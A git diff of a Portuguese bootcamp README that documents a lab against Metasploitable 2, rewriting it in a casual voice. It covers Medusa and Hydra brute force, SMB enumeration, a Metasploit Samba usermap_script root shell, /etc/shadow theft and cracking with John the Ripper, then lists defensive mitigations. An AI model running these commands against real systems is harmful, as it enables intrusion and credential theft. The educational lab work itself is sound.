@@ -1,11 +1,11 @@
-# 🛡️ Laboratório Prático: Ataque de Força Bruta com Medusa e Análise de Logs
+# Laboratório Prático: Ataque de Força Bruta com Medusa e Análise de Logs
 
-> **Projeto prático desenvolvido no Bootcamp Santander Cibersegurança da [DIO](https://dio.me).**  
-> Simulação controlada de ataques de força bruta (*dictionary attack*) e análise defensiva de logs em ambiente virtualizado.
+> **Projeto prático do Bootcamp Santander Cibersegurança na DIO.**
+> Simulação controlada de dictionary attack com Medusa e análise de logs em ambiente virtualizado.
 
 ---
 
-## 📋 Sumário
+## Sumário
 - [Visão Geral](#-visão-geral)
 - [Topologia do Laboratório](#-topologia-do-laboratório)
 - [Metodologia e Execução](#-metodologia-e-execução)
@@ -24,18 +24,19 @@
 
 ---
 
-## 🎯 Visão Geral
+## Visão Geral
 
-O objetivo deste projeto é reproduzir as etapas de um teste de intrusão focado em autenticação, compreendendo na prática:
-1. Como ferramentas automatizadas de força bruta (**Medusa**) realizam tentativas massivas de login contra diferentes serviços de rede.
-2. Como os serviços auditam e registram tentativas falhas e acessos legítimos nos arquivos de log do sistema operacional.
-3. Quais medidas defensivas impedem ou mitigam esses vetores de ataque em um ambiente corporativo real.
+Quis reproduzir um teste de intrusão focado em login. Na prática, eu testei três coisas:
+
+1. Como o Medusa faz força bruta chutando senha em massa contra o serviço.
+2. Como cada serviço registra Failed/Accepted nos logs do sistema.
+3. O que, na defesa, segura esse vetor numa empresa real.
 
 ---
 
-## 🖥️ Topologia do Laboratório
+## Topologia do Laboratório
 
-O ambiente foi configurado de forma isolada no **VMware Workstation Pro**, utilizando uma rede virtual no modo **NAT** (`192.168.81.0/24`):
+Lab isolado no **VMware Workstation Pro**. Rede virtual em NAT (`192.168.81.0/24`):
 
 | Máquina | Papel | Sistema Operacional | Endereço IP |
 | :--- | :--- | :--- | :--- |
@@ -44,21 +45,21 @@ O ambiente foi configurado de forma isolada no **VMware Workstation Pro**, utili
 
 ---
 
-## 🚀 Metodologia e Execução
+## Metodologia e Execução
 
 ### 1. Validação de Conectividade
-Antes de iniciar os testes, foi validado o alcance de rede entre o Kali Linux e o Metasploitable 2:
+Antes de rodar qualquer ataque, confirmei se o Kali alcançava o alvo:
 
 ```bash
 # Executado no Kali Linux
 ping -c 3 192.168.81.129
 ```
-* **Resultado:** 3 pacotes transmitidos, 3 recebidos, **0% packet loss**, confirmando comunicação ativa na sub-rede.
+Retornou 3 pacotes transmitidos, 3 recebidos, **0% packet loss**. Rede OK.
 
 ---
 
 ### 2. Criação da Wordlist
-Foi montado um dicionário de teste (`senhas.txt`) com senhas comuns fracas combinadas com a credencial real do serviço:
+Montei a `senhas.txt` na mão. Juntei senhas fracas comuns com a credencial real do serviço:
 
 ```bash
 cat << 'EOF' > wordlists/senhas.txt
@@ -75,14 +76,13 @@ EOF
 ---
 
 ### 3. Cenário 1: Força Bruta contra FTP (Porta 21)
-O serviço **FTP** (*vsftpd*) foi testado utilizando o módulo `ftp` do Medusa:
+Teste no **FTP** (*vsftpd*) pelo módulo `ftp` do Medusa:
 
 ```bash
 medusa -h 192.168.81.129 -u msfadmin -P wordlists/senhas.txt -M ftp
 ```
 
-* **Resultado obtido:**  
-  O Medusa iterou pelas senhas incorretas e identificou com sucesso a credencial na 7ª tentativa:
+Resultado — ele achou na 7ª tentativa:
 ```text
 ACCOUNT FOUND: [ftp] Host: 192.168.81.129 User: msfadmin Password: msfadmin [SUCCESS]
 ```
@@ -92,13 +92,13 @@ ACCOUNT FOUND: [ftp] Host: 192.168.81.129 User: msfadmin Password: msfadmin [SUC
 ---
 
 ### 4. Cenário 2: Força Bruta contra SSH (Porta 22)
-Em seguida, o teste foi realizado contra o serviço de acesso remoto seguro **OpenSSH**:
+Repiti o teste no **OpenSSH**, porta 22:
 
 ```bash
 medusa -h 192.168.81.129 -u msfadmin -P wordlists/senhas.txt -M ssh
 ```
 
-* **Resultado obtido:**
+Resultado:
 ```text
 ACCOUNT FOUND: [ssh] Host: 192.168.81.129 User: msfadmin Password: msfadmin [SUCCESS]
 ```
@@ -108,28 +108,27 @@ ACCOUNT FOUND: [ssh] Host: 192.168.81.129 User: msfadmin Password: msfadmin [SUC
 ---
 
 ### 5. Auditoria e Análise de Logs no Alvo
-Para validar a perspectiva defensiva, os logs de autenticação do Metasploitable 2 foram acompanhados em tempo real durante os ataques. É importante destacar a separação de arquivos de log por serviço:
+Quis ver onde fica a trilha de auditoria depois dos ataques. Cada serviço loga num arquivo diferente:
 
 #### A. Auditoria do Serviço SSH (OpenSSH)
-Monitorado diretamente no arquivo de autenticação do sistema:
+Acompanhei o `auth.log` em tempo real:
+
 ```bash
 sudo tail -f /var/log/auth.log
 ```
-**Comportamento observado:**
-* As tentativas incorretas geraram múltiplos registros de falha:  
-  `Failed password for msfadmin from 192.168.81.128 port ... ssh2`
-* No momento em que a credencial correta foi testada, o log registrou a autorização:  
-  `Accepted password for msfadmin from 192.168.81.128 port ... ssh2`
+O que eu vi: senha errada gerou `Failed password for msfadmin from 192.168.81.128 port ... ssh2`. Quando acertei, apareceu `Accepted password for msfadmin from 192.168.81.128 port ... ssh2`.
 
 #### B. Auditoria do Serviço FTP (vsftpd)
-O daemon do vsftpd possui registro dedicado para tentativas de login e transferências:
+O vsftpd loga login e transferência no arquivo dele:
+
 ```bash
 sudo tail -f /var/log/vsftpd.log
 ```
 *(Também correlacionado em `/var/log/syslog`).*
 
 #### C. Auditoria pós-ataque (grep)
-Para conferir o que ficou registrado após os ataques:
+Depois do ataque, conferi o que ficou gravado:
+
 ```bash
 # SSH: sucessos e falhas
 sudo grep -E "Failed password|Accepted password" /var/log/auth.log | tail -20
@@ -140,16 +139,15 @@ sudo tail -20 /var/log/vsftpd.log
 sudo grep vsftpd /var/log/auth.log | tail -20
 ```
 
-Esse comportamento evidencia a trilha de auditoria essencial para analistas de SOC (*Security Operations Center*) identificarem ataques volumétricos e anomalias de autenticação em diferentes camadas de serviço.
+É essa trilha que um analyst de SOC usa no SIEM para pegar brute force volumétrico e anomalia de login.
 
 ---
 
 ### 6. Cenário 3: Ataque Web no DVWA
 
-* **Alvo:** Aplicação *Damn Vulnerable Web App* hospedada em `http://192.168.81.129/dvwa/`, nível de segurança `Low`.
-* **Ação:** Teste inicial de força bruta no formulário de login web com **Hydra** (`http-get-form`).
-* **Resultado:** O Hydra retornou 7 "senhas válidas" — **falso positivo**. Por estar sem a flag `-f` (parar no primeiro sucesso) e sem a string de falha correta do DVWA (`Username and/or password incorrect.`), o Hydra interpretou respostas de erro como sucesso. A correção é adicionar `-f` e a string `F=Username and/or password incorrect.` na condição do `hydra`.
-* **DVWA via curl:** Login retorna `302` mas `cookies_auth.txt` sai vazio — **incompleto**. Solução documentada em *Pendências e Retomada*: o cookie de sessão `PHPSESSID` não muda no login, é o estado no servidor que muda. Basta reutilizar o `PHPSESSID` de `cookies.txt`.
+**Alvo:** DVWA em `http://192.168.81.129/dvwa/`, nível `Low`. **Ação:** testei o login web com **Hydra** (`http-get-form`). **Resultado:** retornou 7 “senhas válidas”. Falso positivo. O Hydra estava sem `-f` e sem a string de erro do DVWA (`Username and/or password incorrect.`), então ele contou erro como acerto. Correção: usar `-f` e `F=Username and/or password incorrect.` na condição do `hydra`.
+
+**DVWA via curl:** o login deu `302` mas `cookies_auth.txt` saiu vazio — incompleto. Deixei a solução em *Pendências e Retomada*: o `PHPSESSID` não muda no login, é o estado no servidor que muda. Reutilizei o `PHPSESSID` de `cookies.txt`.
 
 ---
 
@@ -161,20 +159,21 @@ nmap -p 139,445 192.168.81.129           # portas SMB abertas
 enum4linux -U 192.168.81.129              # ~36 usuários enumerados
 enum4linux -a 192.168.81.129              # shares e detalhes
 ```
-**Shares SMB identificados:** `tmp` (gravável), `opt`, `print$`, `ADMIN$`, `IPC$`, `msfadmin`.
+Achei os shares `tmp` (gravável), `opt`, `print$`, `ADMIN$`, `IPC$`, `msfadmin`.
 
 **Exploração — Samba usermap_script (CVE-2007-2447):**
-O Metasploitable 2 roda Samba 3.0.20 vulnerável ao *usermap script*. O exploit fornece shell como **root**:
+O Metasploitable 2 roda Samba 3.0.20, vulnerável ao *usermap script*. O exploit abre shell como **root**:
+
 ```bash
 msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS 192.168.81.129; set LHOST 192.168.81.128; set LPORT 4444; run"
 ```
-**Resultado:** Shell **ROOT** obtido (`uid=0(root)`) — máquina totalmente comprometida. Veja comando de retomada em *Pendências e Retomada*.
+Retornou `uid=0(root)`. Máquina totalmente comprometida. Comando de retomada em *Pendências e Retomada*.
 
 ---
 
 ### 8. Pós-Exploração: /etc/shadow e John the Ripper
 
-Com o shell root, copiei `/etc/shadow` para `/tmp/hashes.txt` e crackeie com **John the Ripper** (format `md5crypt`):
+Com shell root, copiei `/etc/shadow` para `/tmp/hashes.txt` e crackeei com **John the Ripper** (formato `md5crypt`):
 
 ```bash
 john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
@@ -185,32 +184,26 @@ john --format=md5crypt --wordlist=wordlists/senhas.txt /tmp/hashes.txt
 # Total: 6 de 7 hashes crackeados
 ```
 
-**Root NÃO crackeado:** `root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.` — tentativas com rockyou, rules, mask `?l?l?l?l?l?l` e stdin `batman` falharam. Como já somos root via exploit, o crack é opcional (apenas para o relatório); alternativa é hashcat com GPU ou wordlist maior. Detalhes em *Pendências e Retomada*.
+O root eu não quebrei: `root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.`. Tentei rockyou, rules, mask `?l?l?l?l?l?l` e stdin `batman`. Nada. Como eu já tinha root pelo exploit, deixei o crack como opcional, só para o relatório. Se quiser fechar, dá para tentar hashcat com GPU ou wordlist maior. Detalhes em *Pendências e Retomada*.
 
-**Observação:** `setxkbmap br` no início da sessão corrompeu caracteres do prompt (`Б”ҲБ”қ`) — cosmético, não afeta os testes.
-
----
-
-## 🛡️ Mitigações e Recomendações Defensivas
-
-1. **Bloqueio Automático e Rate Limiting:**
-   * Utilizar **Fail2ban** para bloquear automaticamente endereços IP que excedam limites de tentativas incorretas consecutivas.
-2. **Políticas de Senhas Fortes:**
-   * Exigir comprimento mínimo (mínimo de 12 a 16 caracteres), entropia e validação contra dicionários de credenciais vazadas.
-3. **Autenticação Multifator (MFA / 2FA):**
-   * Exigir segundo fator para serviços expostos e portais administrativos.
-4. **Desativação de Protocolos em Texto Claro:**
-   * Descontinuar o uso de **FTP puro** (porta 21), substituindo por **SFTP** ou **FTPS**.
-5. **Autenticação baseada em Chaves Criptográficas:**
-   * No OpenSSH, desabilitar autenticação por senha (`PasswordAuthentication no`) e utilizar chaves públicas/privadas (Ed25519 ou RSA 4096).
-6. **Monitoramento e Alertas de SOC:**
-   * Coletar e correlacionar eventos de autenticação via SIEM para disparar alertas automáticos diante de picos de tentativas falhas.
+**Observação:** o `setxkbmap br` no começo da sessão bagunçou o prompt (`Б”ҲБ”қ`). Só cosmético, não quebrou nenhum teste.
 
 ---
 
-## 🔑 Credenciais Obtidas
+## Mitigações e Recomendações Defensivas
 
-> Credenciais de laboratório intencionalmente vulnerável (Metasploitable 2), obtidas via força bruta, enumeração e pós-exploração.
+1. **Bloqueio automático e rate limiting:** deixo o **Fail2ban** bloqueando o IP depois de várias falhas seguidas.
+2. **Senha forte:** mínimo de 12 a 16 caracteres, com entropia, e checagem contra dicionário de credencial vazada.
+3. **Autenticação multifator (MFA / 2FA):** segundo fator em serviço exposto e portal admin.
+4. **Fim do protocolo em texto claro:** desativo o **FTP** puro (porta 21) e uso **SFTP** ou **FTPS**.
+5. **Chave em vez de senha no SSH:** no OpenSSH uso `PasswordAuthentication no` e chave pública/privada (Ed25519 ou RSA 4096).
+6. **Monitoramento de SOC:** coleto login no SIEM e crio alerta quando o volume de Failed dispara.
+
+---
+
+## Credenciais Obtidas
+
+Senhas do Metasploitable 2, lab vulnerável de propósito. Peguei por brute force, enumeração e pós-exploração.
 
 | Serviço | Usuário | Senha | Origem |
 | :--- | :--- | :--- | :--- |
@@ -227,18 +220,16 @@ john --format=md5crypt --wordlist=wordlists/senhas.txt /tmp/hashes.txt
 
 ---
 
-## ⏳ Pendências e Retomada
+## Pendências e Retomada
 
 ### 1. Crack do hash do root (único que falta)
 ```
 root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
 ```
-- Tentativas feitas: rockyou, rules, mask `?l?l?l?l?l?l`, stdin `batman` → **sem sucesso**
-- **Sugestão:** como já é **root** via Samba usermap_script, o crack é opcional (só para relatório). Alternativa: `passwd root` no shell root, ou hashcat com GPU.
+Tentativas: rockyou, rules, mask `?l?l?l?l?l?l`, stdin `batman` → **sem sucesso**. Como eu já sou **root** pelo Samba usermap_script, o crack é opcional, só para fechar o relatório. Alternativas: `passwd root` no shell root, ou hashcat com GPU.
 
 ### 2. DVWA via curl (opcional)
-- Login retorna `302` mas `cookies_auth.txt` sai vazio
-- **Sugestão:** usar o mesmo `PHPSESSID` do `cookies.txt` (o cookie de sessão não muda no login, só o estado no servidor) e testar:
+O login retornou `302` mas `cookies_auth.txt` saiu vazio. O `PHPSESSID` é o mesmo de `cookies.txt`, não muda no login. É o estado no servidor que muda. Teste com:
 ```bash
 PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $7}')
 curl -b "PHPSESSID=$PHPSESSID; security=low" \
@@ -247,7 +238,7 @@ curl -b "PHPSESSID=$PHPSESSID; security=low" \
 ```
 
 ### 3. Hydra do DVWA (corrigir falso positivo)
-- Adicionar `-f` (parar no primeiro) e usar string de falha correta (`Username and/or password incorrect.`) — o output mostrou 7 "válidas", o que é impossível.
+Falta `-f` e a string de falha correta (`Username and/or password incorrect.`). O output mostrou 7 “válidas”, impossível. Corrijo com `-f`.
 
 ### Comandos para retomar
 
@@ -267,10 +258,10 @@ curl -b "PHPSESSID=$PHPSESSID; security=low" \
 ```
 
 **Observações:**
-- O hash do root **não está no rockyou** com as regras usadas; pode ser necessário hashcat + GPU ou wordlist maior.
-- `setxkbmap br` no início corrompeu alguns caracteres do prompt (`Б”ҲБ”қ`) — cosmético, não afeta nada.
-- A sessão MSF foi fechada acidentalmente (`exit`); para reabrir basta rodar o msfconsole novamente com o mesmo comando.
-- **SSH no Kali novo:** o Metasploitable só oferece chaves antigas (`ssh-rsa,ssh-dss`). Se der `no matching host key type found`, conectar com:
+- O hash do root **não está no rockyou** com as regras que usei; pode precisar de hashcat + GPU ou wordlist maior.
+- `setxkbmap br` bagunçou alguns caracteres do prompt (`Б”ҲБ”қ`) — cosmético, não quebrou nada.
+- A sessão MSF fechou por engano (`exit`); para reabrir, rodo o msfconsole de novo com o mesmo comando.
+- **SSH no Kali novo:** o Metasploitable só oferece chaves antigas (`ssh-rsa,ssh-dss`). Se der `no matching host key type found`, conecto com:
   ```bash
   ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.81.129
   # senha: msfadmin
@@ -278,7 +269,7 @@ curl -b "PHPSESSID=$PHPSESSID; security=low" \
 
 ---
 
-## 📁 Estrutura do Projeto
+## Estrutura do Projeto
 
 ```text
 medusa-kali-lab/
